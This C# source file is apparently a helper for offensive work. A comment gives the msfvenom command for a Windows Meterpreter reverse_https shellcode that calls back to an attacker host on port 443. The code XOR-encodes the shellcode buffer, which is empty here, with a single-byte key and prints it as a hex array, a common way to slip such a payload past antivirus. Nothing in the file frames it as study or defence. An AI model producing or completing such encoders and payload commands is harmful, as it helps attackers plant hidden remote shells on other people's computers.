using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    class Program
    {
        // sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 -f csharp
        static void Main(string[] args)
        {
            byte[] buf = new byte[693] {};

            byte key = 3;

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(buf[i] ^ key);
            }

            int count = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
                count++;
            }

            Console.WriteLine("Length is "+ count + " The payload is: " + hex.ToString());
        }
    }
}
